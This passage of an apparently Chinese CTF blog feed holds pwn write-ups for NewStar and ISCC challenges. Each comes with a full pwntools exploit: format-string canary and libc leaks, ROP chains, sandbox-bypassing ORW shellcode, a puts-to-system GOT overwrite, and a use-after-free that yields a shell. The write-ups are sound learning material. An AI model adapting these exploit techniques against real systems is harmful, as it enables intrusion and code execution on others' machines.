b&#x27;./flag\x00\x00&#x27;+b&#x27;A&#x27;*(0x30-8-8)+p64(canary)+p64(0)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(stack_addr+0x80)+p64(pop_rdx_rbx)+p64(0x200)*2+p64(read_addr)+p64(pop_rdi)<br>payload +=p64(0xffffff9c)+p64(pop_rsi)+p64(stack_addr)+p64(pop_rdx_rbx)+p64(0)*2+p64(openat_addr)<br>payload +=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack_addr+0x200)+p64(pop_rdx_rbx)+p64(0x30)*2+p64(read_addr)<br>payload +=p64(pop_rdi)+p64(stack_addr+0x200)+p64(puts_addr)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStar-WEEK3-ezorw-putorsys</title>
    <link href="/2024/10/23/ezorw/"/>
    <url>/2024/10/23/ezorw/</url>
    
    <content type="html"><![CDATA[<h2 id="NewStar-WEEK3"><a href="#NewStar-WEEK3" class="headerlink" title="NewStar-WEEK3"></a>NewStar-WEEK3</h2><h2 id="ezorw"><a href="#ezorw" class="headerlink" title="ezorw"></a>ezorw</h2><p>最近作业多，事务繁忙，好久没打题了，继续看看新生赛最新一周放出来的题。主打一个复健，不过近来的新生赛进度都好快。</p><p>开了NX和canary</p><p><img src="D:\刷题wp\picture\image-20231016200005414.png" alt="image-20231016200005414"></p><p>  利用格式化字符串泄露出canary，然后因为题目给了libc文件，又提示是rop，本来打算用ret2libc泄露libc基地址，结果发现该程序中居然没有可以用的pop链。。Σ(っ °Д °;)っ  </p><p>  怎么办呢，经过思考后，突然想到，printf前的read给了那么大，还可以输出别的啊，然后就去gdb里看，发现有个__libc_start_main+123。好好好，泄露出它来，然后就有libc基地址了，可以用libc里的pop。</p><p>​主程序中的read结束后就可以再调用一个read，往mmap那个权限全开的地方注入shellcode的orw（因为开了沙箱）</p><p>结果–本地打通后，发现远程打不通。。</p><p>为什么呢：刚开始泄露的libc是本地的libc，偏移不一样。。。忘了这茬了。</p><p>好，改文件的libc。</p><p>完毕。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./ezorw&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27480)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br>shell_addr = <span class="hljs-number">0x66660000</span><br><br>sd(<span class="hljs-string">&#x27;%11$paaa%33$p&#x27;</span>)<br>rl()<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-comment">#print(hex(canary))</span><br>rc(<span class="hljs-number">3</span>)<br>libc_main_addr = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>libc_base = libc_main_addr + <span class="hljs-number">0x7ffff7c00000</span>  - <span class="hljs-number">0x7ffff7c29e40</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>read_plt = <span class="hljs-number">0x401130</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>libc = ELF(<span class="hljs-string">&#x27;/home/kali/Desktop/libc.so.6&#x27;</span>)<br><br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>pop_rsi = libc_base + <span class="hljs-number">0x2be51</span><br>pop_rdx_r12 = libc_base +<span class="hljs-number">0x11f497</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">pop_rdi = libc_base + 0x27725 </span><br><span class="hljs-string">pop_rsi = libc_base + 0x028ed9</span><br><span class="hljs-string">pop_rdx = libc_base + 0xfdd4d</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>code = asm(code)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(code))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>)+p64(canary)*<span class="hljs-number">2</span>+p64(pop_rsi)+p64(shell_addr)+p64(pop_rdx_r12)+p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span><br><span class="hljs-comment">#payload = b&quot;A&quot;*(0x30-0x8)+p64(canary)*2+p64(pop_rsi)+p64(shell_addr)+p64(pop_rdx)+p64(0x2e)</span><br>payload +=p64(read_plt)+p64(shell_addr)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x90</span>+(code)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>sd(payload)<br><span class="hljs-comment">#rl()</span><br><span class="hljs-comment">#sd(code)</span><br><br><br>p.interactive()<br><span class="hljs-comment">#那个不计算长度的话，可以在接收最后的输出后，再输入code。</span><br><span class="hljs-comment">#当然，也可以像脚本的一样一口气来。</span><br></code></pre></td></tr></table></figure><h2 id="putsorsys"><a href="#putsorsys" class="headerlink" title="putsorsys"></a>putsorsys</h2><p><img src="D:\刷题wp\picture\image-20231017121138183.png" alt="image-20231017121138183"></p><p>保护：NX和canary，以及partial relro(证明可改got表对应的值)</p><p>思路：格式化字符串泄露libc，然后用system替换掉puts_got。（其实也可以泄露canary，然后栈溢出打ret2libc）</p><p>注意：运用格式化字符串的时候要小心\x00是它的结束标志。</p><p>exp:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./putsorsys&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25885</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br>puts_got = <span class="hljs-number">0x404018</span><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = b<span class="hljs-string">&#x27;%9$saaaa&#x27;</span>+p64(puts_got)<br><span class="hljs-comment">#gdb.attach(p)</span><br>sd(payload)<br>puts_addr = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span><span class="hljs-symbol">:</span>].ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#print(hex(puts_addr))</span><br>libc = <span class="hljs-variable constant_">ELF</span>(<span class="hljs-string">&#x27;/home/kali/Desktop/libc.so.6&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base +libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sl(b<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = fmtstr_payload(<span class="hljs-number">8</span>,&#123;<span class="hljs-symbol">puts_got:</span>system_addr&#125;)<br><span class="hljs-comment">#gdb.attach(p)</span><br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>限制7字节写入执行的orw</title>
    <link href="/2024/10/23/%E9%99%90%E5%88%B67%E5%AD%97%E8%8A%82%E5%86%99%E5%85%A5%E6%89%A7%E8%A1%8C%E7%9A%84orw/"/>
    <url>/2024/10/23/%E9%99%90%E5%88%B67%E5%AD%97%E8%8A%82%E5%86%99%E5%85%A5%E6%89%A7%E8%A1%8C%E7%9A%84orw/</url>
    
    <content type="html"><![CDATA[<h3 id="限制7字节写入执行的orw"><a href="#限制7字节写入执行的orw" class="headerlink" title="限制7字节写入执行的orw"></a>限制7字节写入执行的orw</h3><p><img src="https://telegraph-image-5jy.pages.dev/file/0e586b2a94e080962962b.png" alt="image-20240513101936436"></p><ul><li>buf处直接执行机器码，向其中写入read，然后再往下orw即可。这里注意，如果添加太多值就会导致超了7，所以能简洁尽量简洁。尽可能用原有的寄存器，本来想写入到buf+一段空间，但是还有对空间进行计算，所以直接往buf写，用nop填充滑下去就好。</li><li>另：温习asm转化汇编为机器码的格式。</li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;47.98.236.4&#x27;,5001)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">                   mov edx,esi</span><br><span class="hljs-string">                   syscall</span><br><span class="hljs-string">                &#x27;&#x27;&#x27;</span>)<br><br>debug()<br>sd(shellcode)<br><br>shellcode = <span class="hljs-string">b&#x27;\x90&#x27;</span>*(<span class="hljs-number">8</span>)<br>shell = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x600500</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x600500</span>,<span class="hljs-number">0x30</span>))<br><br>shellcode += shell<br><br>sd(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iscc-U</title>
    <link href="/2024/10/23/iscc-U/"/>
    <url>/2024/10/23/iscc-U/</url>
    
    <content type="html"><![CDATA[<h4 id="iscc-U"><a href="#iscc-U" class="headerlink" title="iscc-U"></a>iscc-U</h4><p>一道特殊的uaf，高版本，没开pie，特殊的打印机制。</p><p>警告：极其混乱，掺杂着无数次歪路</p><ul><li>由于没有libc文件，不知道libc版本，没用unsotedbin泄露，不知道该减多少。</li></ul><p>打印函数：</p><p><img src="https://telegraph-image-5jy.pages.dev/file/d9a9a109080c3f7c264ee.png" alt="image-20240512220930394"></p><p>创建函数：</p><p><img src="https://telegraph-image-5jy.pages.dev/file/2d617a3a767bf7d4626ec.png" alt="image-20240512221024284"></p><p>删除函数：</p><p><img src="https://telegraph-image-5jy.pages.dev/file/865d03c04189b910ba0a0.png" alt="image-20240512221102206"></p><ol><li>先创三个堆看看notelist的储存形式：</li></ol><p><img src="https://telegraph-image-5jy.pages.dev/file/ea7da28bd690c413e4710.png"></p><ul><li>关于c语言：notelist本身指代的是这个空间指向的数据。例如int notelist &#x3D; aaaaaaaa,notelist就会指代这个aaaaaaa,&amp;notelist才会是指向的空间。这里也是这个道理，&amp;notelist 才是0x804c048。（但是gdb就是用notelist列来表示这个地址，只是C语言用&amp;来取）</li><li>可以看到，这里存储的都是对应的printf_note（也是关键的利用点，相对不容易想到）开始想着是写死了，无法修改，其实释放掉两个块，然后创建一个8的块，就可以写入到先释放的8的块里。</li></ul><ol start="2"><li><p>按上述进行测试输入puts_plt</p><p><img src="https://telegraph-image-5jy.pages.dev/file/4dcfd085d4ca5d8f232e2.png" alt="image-20240512221916405"></p></li><li><p>回忆忘记的点：</p><p>malloc返回的地址都是指向数据域的。。。</p></li><li><p>注意看创建函数那里，数据域的堆的指针是放在了第一个小堆里的，然后输入数据的时候选了相同的地址把它覆盖掉了，但是输入数据的地址刚好会是第二个小堆的数据域！（纠错，没有覆盖，就是普通的+4,虽然c语言中指针p++是一下子加对应的字节数，但这里就是普通的加数值4）</p><p><img src="https://telegraph-image-5jy.pages.dev/file/1939b68bbea3d9749b24a.png" alt="image-20240512225105450"></p></li></ol><ul><li><p>本来想着会不会直接引用到未分配的地址，但是细看，先创建了第二个数据堆，才将地址赋予的，妙蛙妙蛙</p><p><img src="https://telegraph-image-5jy.pages.dev/file/be8a37e23d6cdc5a90f75.png" alt="image-20240512225358596"></p></li><li><p>纠错</p><p><img src="https://telegraph-image-5jy.pages.dev/file/fdf567d47e1ff7d9867ec.png" alt="image-20240512233043692"></p></li></ul><ol start="5"><li><p>注意这里是有参数的哦</p><p><img src="https://telegraph-image-5jy.pages.dev/file/d6ae5e03f17c3265ee8d5.png" alt="image-20240512225434604"></p></li><li><p>为了利用到后续的数据，不能直接用puts_plt，而是题目中的print_note。另外，teache bin 后进先出。</p><p><img src="https://telegraph-image-5jy.pages.dev/file/419a22cf11018c519ddd2.png" alt="image-20240512231944374"></p></li></ol><p>1号堆的小堆1被当作新堆的print_note,0号堆的小堆1被当作新堆的数据域。但是它的数据还是在堆0的下方，把上面的巧合构成的无漏洞变成了漏洞。</p><p>另外：不知道为啥puts_got输出不出来，换成read_got就没事了。</p><ol start="7"><li>替换为system，实际执行为system(地址)，地址中存的是p32(system);$0;，第一个显然不是正常参数，所以会执行第二个。</li><li>远程system需要+4来跳过这个函数</li></ol><p><img src="https://telegraph-image-5jy.pages.dev/file/0abbbe7cdbe5e9e67795b.png" alt="image-20240513002740004"></p><p>如果不+4，报这个错误，但是程序不中断（只有+4和+1可以通过）</p><p><img src="https://telegraph-image-5jy.pages.dev/file/c86745efd43105bb5cec6.png" alt="image-20240513102740263"></p><p><img src="https://telegraph-image-5jy.pages.dev/file/de41b2b7fdfe38b55d23d.png" alt="image-20240513102947864"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">__x86<span class="hljs-selector-class">.get_pc_thunk</span><span class="hljs-selector-class">.dx</span> 是一个在某些编译器和操作系统下生成的特殊符号（symbol），通常在 x86 架构的程序中会看到这个符号出现。这个符号的作用是为了在程序中获取当前代码的位置计数器（Program Counter）的地址。<br><br>在 x86 架构中，程序执行时会使用一种相对寻址的方式来访问指令，这种方式会使用一个基地址加上相对地址的偏移量来确定指令的位置。__x86<span class="hljs-selector-class">.get_pc_thunk</span><span class="hljs-selector-class">.dx</span> 函数就是用来获取这个基地址，以便在程序中动态计算其他符号的地址。<br><br>通常情况下，程序员很少会直接调用或使用 __x86<span class="hljs-selector-class">.get_pc_thunk</span>.dx，因为这个函数主要被编译器和链接器内部使用。它在一些特定的链接策略中扮演着重要的角色，确保代码能够正确地执行并访问所需的数据和函数。<br></code></pre></td></tr></table></figure><p>gpt这么解释的，怀疑会导致符号错误，明天有时间了换了libc文件试试。。</p><blockquote><p>踩坑日记：不要乱用别的libc，就用泄露的去下载，别偷懒！！！！</p></blockquote><p>调进去就是正常的system</p><p><img src="https://telegraph-image-5jy.pages.dev/file/eec87cf72be4a62f13574.png" alt="image-20240513111542083"></p><p>执行处</p><p><img src="https://telegraph-image-5jy.pages.dev/file/4f9f2ca7c9a26c8fcab41.png" alt="image-20240513112111471"></p><p>system+4的这里</p><p><img src="https://telegraph-image-5jy.pages.dev/file/6e906946ca44e62ef15a5.png" alt="image-20240513112127085"></p><p>啊！看着一模一样啊，而且各个参数的情况也一模一样，跳过一个endbr32按理说也没啥用啊。。。。</p><p>system的本质是execve，那就下断点去看execve，+4的情况：</p><p><img src="https://telegraph-image-5jy.pages.dev/file/120cad2bfc1d70fc3c922.png" alt="image-20240513112747384"></p><p><img src="https://telegraph-image-5jy.pages.dev/file/632a72593861a6d7e3147.png" alt="image-20240513112828074"></p><p>突然发现变成64位了？？？？印象中有64、32的转换，搜了搜。（这篇看着不错，先保存，有时间再看）</p><p><a href="https://www.cnblogs.com/countfatcode/p/11756258.html">Shellcode - countfatcode - 博客园 (cnblogs.com)</a></p><p><img src="https://telegraph-image-5jy.pages.dev/file/bcf5f0a796b3500c77959.png" alt="image-20240513113236988"></p><p>不加4的话，在这个sysenter这里直接寄掉了</p><p><img src="https://telegraph-image-5jy.pages.dev/file/b0ac0b63513cb863c0f90.png" alt="image-20240513113708057"></p><p>怀疑是32位跳64位的时候被endbr32开启的cet检测给影响了，但是运行的程序没有被中断啊。。。</p><p>又去查看跳转前的寄存器，二者也没啥区别。。。</p><p><img src="https://telegraph-image-5jy.pages.dev/file/3587abe4474c54eb2187f.png" alt="image-20240513115110709"></p><p><img src="https://telegraph-image-5jy.pages.dev/file/e6833a1aa4746a21e09a2.png" alt="image-20240513115115155"></p><p>查报错说可能是反引号的问题，打印一下看看</p><p><img src="https://telegraph-image-5jy.pages.dev/file/99f6d37291378e1380258.png" alt="image-20240513115511388"></p><p>成了！</p><p><img src="https://telegraph-image-5jy.pages.dev/file/fdbd82f8ab3072278f3cc.png" alt="image-20240513115901212"></p><p>（但是还是调试不进去）</p><p>附加linux指令：</p><blockquote><p>用分号连接，表示执行多条指令</p><p>system(“command1; command2; command3”);</p><p>用&amp;&amp;连接，表示前一条成功才运行后一条</p><p>system(“command1 &amp;&amp; command2 &amp;&amp; command3”);</p><p>用||连接，前一条失败运行后一条</p><p>system(“command1 || command2 || command3”);</p></blockquote><p>exp：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./000&#x27;)<br>p=remote(&#x27;182.92.237.102&#x27;,10016)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>def new(size,content):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;1&#x27;)<br>    ru(&#x27;size&#x27;)<br>    sd(size)<br>    <span class="hljs-punctuation">#</span><span class="hljs-keyword">rl</span><span class="hljs-params">()</span><br>    sd(content)<br><br>def show(index):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;3&#x27;)<br>    ru(&#x27;Index&#x27;)<br>    sd(index)<br><br>def dele(index):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;2&#x27;)<br>    rl()<br>    sd(index)<br>print_note = 0x80492b6 <br>read_got = 0x804C00C<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">new</span><span class="hljs-params">(&#x27;1056&#x27;,<span class="hljs-string">&quot;AAAA&quot;</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">new</span><span class="hljs-params">(&#x27;1056&#x27;,<span class="hljs-variable">b</span>&#x27;<span class="hljs-variable">BBBB</span>&#x27;)</span><br><br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(&#x27;0&#x27;)<br>dele(&#x27;0&#x27;)<br>dele(&#x27;1&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>new(&#x27;8&#x27;,p32(print_note)+p32(read_got))<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(&#x27;0&#x27;)<br>read_addr = u32(ru(&#x27;\xf7&#x27;)[-4:])<br>print(hex(read_addr))<br>pause()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>&#x27;&#x27;&#x27;<br>libc_base = read_addr - 0x0f0780<br>system_addr = libc_base + 0x041360 +1<br>&#x27;&#x27;&#x27;<br>libc = ELF(&#x27;/usr/lib/i386-linux-gnu/libc.so.6&#x27;)<br><br>libc_base = read_addr  - libc.sym[&#x27;read&#x27;]<br>system_addr = libc_base + libc.sym[&#x27;system&#x27;] <br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>dele(&#x27;1&#x27;)<br>dele(&#x27;2&#x27;)<br><br>new(b&#x27;8&#x27;,p32(system_addr)+b&#x27;;sh;&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(b&#x27;1&#x27;)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>调试exp：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)<br>p=process(&#x27;./111&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=remote(&#x27;182.92.237.102&#x27;,10016)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>def new(size,content):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;1&#x27;)<br>    ru(&#x27;size&#x27;)<br>    sd(size)<br>    <span class="hljs-punctuation">#</span><span class="hljs-keyword">rl</span><span class="hljs-params">()</span><br>    sd(content)<br><br>def show(index):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;3&#x27;)<br>    ru(&#x27;Index&#x27;)<br>    